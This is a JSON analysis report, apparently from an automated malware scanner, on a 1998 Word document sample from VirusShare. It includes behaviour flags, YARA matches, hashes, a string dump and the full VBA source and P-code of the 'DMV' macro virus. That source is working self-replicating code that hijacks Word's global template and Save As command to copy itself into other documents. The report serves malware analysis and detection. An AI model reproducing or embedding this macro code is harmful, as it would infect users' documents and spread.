{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"AutoClose\"",
            "Attribute VB_Name = \"DMV\""
        ],
        "behavior": {
            "AutoClose": "Runs when the Word document is closed",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code"
        },
        "macro": "\n\n\nPublic Sub MAIN()\nDim iMacroCount\nDim i\nDim binstalled\nDim bTooMuchTrouble\nDim sMe$\nDim sMacro$\n'just to prove another point\nOn Error GoTo -1: On Error GoTo Abort\niMacroCount = WordBasic.CountMacros(0, 0)\n'see we're already installed\nFor i = 1 To iMacroCount\n    If WordBasic.[MacroName$](i, 0, 0) = \"DMV\" Then\n        binstalled = -1\n    End If\n    If WordBasic.[MacroName$](i, 0, 0) = \"FileSaveAs\" Then\n        bTooMuchTrouble = -1\n    End If\nNext i\nIf Not binstalled And Not bTooMuchTrouble Then\n    'add FileSaveAs and copies of FileSaveAs and AutoClose\n    'DMV is just for more fun\n    sMe$ = WordBasic.[FileName$]()\n    sMacro$ = sMe$ + \":DMV\"\n    WordBasic.MacroCopy sMacro$, \"Global:FileSaveAs\"\n    sMacro$ = sMe$ + \":AutoClose\"\n    WordBasic.MacroCopy sMacro$, \"Global:DMV\"\n    WordBasic.MsgBox \"               DMV               \", 1\nEnd If\nAbort:\nEnd Sub\n\n\n\nPublic Sub MAIN()\nDim sMe$\nDim sTMacro$\n'just to prove another point\n'this becomes the FileSaveAs for the original template\nDim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)\nOn Error GoTo -1: On Error GoTo Bail\nWordBasic.CurValues.FileSaveAs dlg\nWordBasic.Dialog.FileSaveAs dlg\nIf dlg.Format = 0 Then dlg.Format = 1\nsMe$ = WordBasic.[FileName$]()\nsTMacro$ = sMe$ + \":AutoClose\"\nWordBasic.MacroCopy \"Global:DMV\", sTMacro$\nsTMacro$ = sMe$ + \":DMV\"\nWordBasic.MacroCopy \"Global:FileSaveAs\", sTMacro$\nWordBasic.FileSaveAs dlg\nGoTo Done\n\nBail:\nIf Err.Number <> 102 Then\n    WordBasic.FileSaveAs dlg\nEnd If\nDone:\nEnd Sub\n\n' Processing file: VirusShare_1c5d9adbaa0b8fb18b95d2927605bb56\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 965 bytes\n' Macros/VBA/AutoClose - 2410 bytes\n' Line #0:\n' Line #1:\n' \tFuncDefn (Public Sub MAIN())\n' Line #2:\n' \tDim \n' \tVarDefn iMacroCount\n' Line #3:\n' \tDim \n' \tVarDefn i\n' Line #4:\n' \tDim \n' \tVarDefn binstalled\n' Line #5:\n' \tDim \n' \tVarDefn bTooMuchTrouble\n' Line #6:\n' \tDim \n' \tVarDefn sMe\n' Line #7:\n' \tDim \n' \tVarDefn sMacro\n' Line #8:\n' \tQuoteRem 0x0000 0x001B \"just to prove another point\"\n' Line #9:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError Abort \n' Line #10:\n' \tLitDI2 0x0000 \n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemLd CountMacros 0x0002 \n' \tSt iMacroCount \n' Line #11:\n' \tQuoteRem 0x0000 0x001B \"see we're already installed\"\n' Line #12:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd iMacroCount \n' \tFor \n' Line #13:\n' \tLd i \n' \tLitDI2 0x0000 \n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemLd [MacroName$] 0x0003 \n' \tLitStr 0x0003 \"DMV\"\n' \tEq \n' \tIfBlock \n' Line #14:\n' \tLitDI2 0x0001 \n' \tUMi \n' \tSt binstalled \n' Line #15:\n' \tEndIfBlock \n' Line #16:\n' \tLd i \n' \tLitDI2 0x0000 \n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemLd [MacroName$] 0x0003 \n' \tLitStr 0x000A \"FileSaveAs\"\n' \tEq \n' \tIfBlock \n' Line #17:\n' \tLitDI2 0x0001 \n' \tUMi \n' \tSt bTooMuchTrouble \n' Line #18:\n' \tEndIfBlock \n' Line #19:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #20:\n' \tLd binstalled \n' \tNot \n' \tLd bTooMuchTrouble \n' \tNot \n' \tAnd \n' \tIfBlock \n' Line #21:\n' \tQuoteRem 0x0004 0x0035 \"add FileSaveAs and copies of FileSaveAs and AutoClose\"\n' Line #22:\n' \tQuoteRem 0x0004 0x0018 \"DMV is just for more fun\"\n' Line #23:\n' \tLd WordBasic \n' \tArgsMemLd [FileName$] 0x0000 \n' \tSt sMe$ \n' Line #24:\n' \tLd sMe$ \n' \tLitStr 0x0004 \":DMV\"\n' \tAdd \n' \tSt sMacro$ \n' Line #25:\n' \tLd sMacro$ \n' \tLitStr 0x0011 \"Global:FileSaveAs\"\n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #26:\n' \tLd sMe$ \n' \tLitStr 0x000A \":AutoClose\"\n' \tAdd \n' \tSt sMacro$ \n' Line #27:\n' \tLd sMacro$ \n' \tLitStr 0x000A \"Global:DMV\"\n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #28:\n' \tLitStr 0x0021 \"               DMV               \"\n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall MsgBox 0x0002 \n' Line #29:\n' \tEndIfBlock \n' Line #30:\n' \tLabel Abort \n' Line #31:\n' \tEndSub \n' Macros/VBA/DMV - 2014 bytes\n' Line #0:\n' Line #1:\n' \tFuncDefn (Public Sub MAIN())\n' Line #2:\n' \tDim \n' \tVarDefn sMe\n' Line #3:\n' \tDim \n' \tVarDefn sTMacro\n' Line #4:\n' \tQuoteRem 0x0000 0x001B \"just to prove another point\"\n' Line #5:\n' \tQuoteRem 0x0000 0x0035 \"this becomes the FileSaveAs for the original template\"\n' Line #6:\n' \tDim \n' \tVarDefn dlg (As Object)\n' \tBoS 0x0000 \n' \tSetStmt \n' \tLitVarSpecial (False)\n' \tLd WordBasic \n' \tMemLd DialogRecord \n' \tArgsMemLd FileSaveAs 0x0001 \n' \tSet dlg \n' Line #7:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError Bail \n' Line #8:\n' \tLd dlg \n' \tLd WordBasic \n' \tMemLd CurValues \n' \tArgsMemCall FileSaveAs 0x0001 \n' Line #9:\n' \tLd dlg \n' \tLd WordBasic \n' \tMemLd Dialog \n' \tArgsMemCall FileSaveAs 0x0001 \n' Line #10:\n' \tLd dlg \n' \tMemLd Format$ \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitDI2 0x0001 \n' \tLd dlg \n' \tMemSt Format$ \n' \tEndIf \n' Line #11:\n' \tLd WordBasic \n' \tArgsMemLd [FileName$] 0x0000 \n' \tSt sMe$ \n' Line #12:\n' \tLd sMe$ \n' \tLitStr 0x000A \":AutoClose\"\n' \tAdd \n' \tSt sTMacro$ \n' Line #13:\n' \tLitStr 0x000A \"Global:DMV\"\n' \tLd sTMacro$ \n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #14:\n' \tLd sMe$ \n' \tLitStr 0x0004 \":DMV\"\n' \tAdd \n' \tSt sTMacro$ \n' Line #15:\n' \tLitStr 0x0011 \"Global:FileSaveAs\"\n' \tLd sTMacro$ \n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #16:\n' \tLd dlg \n' \tLd WordBasic \n' \tArgsMemCall FileSaveAs 0x0001 \n' Line #17:\n' \tGoTo Done \n' Line #18:\n' Line #19:\n' \tLabel Bail \n' Line #20:\n' \tLd Err \n' \tMemLd Number \n' \tLitDI2 0x0066 \n' \tNe \n' \tIfBlock \n' Line #21:\n' \tLd dlg \n' \tLd WordBasic \n' \tArgsMemCall FileSaveAs 0x0001 \n' Line #22:\n' \tEndIfBlock \n' Line #23:\n' \tLabel Done \n' Line #24:\n' \tEndSub \n"
    },
    "filename": "VirusShare_1c5d9adbaa0b8fb18b95d2927605bb56",
    "filesize": 30720,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Author: l, Template: Normal.dot, Last Saved By: l, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Total Editing Time: 01:00, Create Time/Date: Sat Jan  3 15:42:00 1998, Last Saved Time/Date: Sat Jan  3 15:42:00 1998, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "1c5d9adbaa0b8fb18b95d2927605bb56",
        "sha1": "9377a72cdee29afb0346518b44aeceab5c552c06",
        "sha256": "e5d3be8ea8aabba9b577fe61139f2949c524857696c5252e7d1e285d4dc1059d"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj\u064e",
            "/ =!",
            "Normal.dot",
            "Microsoft Word 8.0",
            "Title",
            "_PID_GUID",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "0{00020P906-",
            "$0046}",
            "|Creatabl",
            "False",
            "Predecla",
            "\"@Expose",
            "emplateD0eriv",
            "eCustomiz",
            "just to prove another point",
            "see we're already installed",
            "FileSaveAs",
            "add FileSaveAs and copies of FileSaveAs and AutoClose",
            "DMV is just for more fun",
            ":DMV",
            "Global:FileSaveAs",
            ":AutoClose",
            "Global:DMV ",
            "               DMV               ",
            "Attribut",
            "e VB_Nam",
            "e = \"Aut",
            "oClose\"",
            "Publi",
            "c Sub MA",
            "IN()",
            "m iMacro`Count",
            "installe",
            "TooMucPhTro",
            "(s8Me$",
            "ust to p",
            "rove ano",
            "ther poi",
            "`On Erro",
            "r GoTo -",
            "Abor",
            "WordB`asic.",
            "s (0, 0",
            "'see we'r5lready \\F",
            "If -[+\u105d$](i",
            "\"DMV\" Then",
            "End I",
            ",FileSaveAs",
            "Next i",
            "4Not H$A!",
            "0'add ",
            "id copies of",
            "FC6B'C is yf\u0240Wmo^fuDGA@+U",
            "DUkAOsBZ$\tB",
            "+ \":X",
            "B\tCopy ",
            ", \"Global:.",
            "!sgBox ",
            "\", \u01c0:",
            "$ = P(",
            "   P>",
            " sMa`@",
            "just to prove another point",
            "Then",
            "this becomes the FileSaveAs for the original template",
            ":AutoClose",
            "Global:DMV  >",
            ":DMV",
            "Global:FileSaveAs",
            "Attribut",
            "e VB_Nam",
            "e = \"DMV",
            "lic Sub ",
            "MAIN()",
            "Dim sMe$",
            "$TMacro",
            "'just to",
            " prove a",
            "nother p",
            "oint",
            "his beco",
            "mes ",
            "2 Fi",
            "leSaveAs",
            " for",
            "ginal te@mplate",
            "%Obje",
            "ct: Set ",
            "= WordB",
            "asic.Dia",
            "logR",
            "^rd.",
            "Y(False",
            "@On Err",
            "oTo -1: ",
            "Bail",
            "CurValue>s",
            ".Format0 Then\t1",
            "[\u907f$]",
            "+ \":AutoClose",
            "Copy \"Gl obal:,  5%\"Q\"\t",
            "^.Numb",
            "@<> 102",
            "End |If",
            "334ae5c48",
            "434ae5c48",
            "534ae5c48",
            "DEST",
            "DEST",
            "DEST",
            "Wordk",
            "Win16~",
            "Win32",
            "goat-97",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Module1b",
            "DMVa",
            "MAIN,",
            "iMacroCount^",
            "binstalled",
            "bTooMuchTrouble7^",
            "sMacro",
            "Abort",
            "WordBasic",
            "CountMacros",
            "MacroName$",
            "FileName$m",
            "MacroCopyE",
            "MsgBoxR",
            "AutoClose",
            "FileSaveAs",
            "sTMacro",
            "dlg-",
            "DialogRecord",
            "Bail>",
            "CurValues\u0224",
            "Dialogf",
            "Done",
            "Erro",
            "Number-",
            "Documentj",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "STDOLE2.",
            "TLB#",
            "tomation",
            "mMSFo@rms>",
            "FC2E845",
            "62-635F-",
            "11D1-8BD",
            "2-444553",
            "3.TW",
            "D#MicrosPoft ",
            " Libr8ary",
            "P3$PTMP\\VBE\\E&",
            "EXg&.E",
            "vOff",
            "vR2DF8",
            "D04C-5BF",
            "A-101B-BHDE5",
            "2RD:\\OFFICE97",
            ",O97.DLLR",
            " 8.0R",
            "ThisDocu ment",
            "o@4e",
            "DPMV",
            "ThisDocument",
            "AutoClose",
            "ID=\"{0D38486B-841F-11D1-8BD2-444553540000}\"",
            "Document=ThisDocument/&H00000000",
            "Module=AutoClose",
            "Module=DMV",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"222059B97FBD7FBD7FBD7FBD\"",
            "DPB=\"44463FE3430P",
            "444044404\"",
            "GC=\"66641DFD1D3D3E3E3E3EC1\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.292201",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
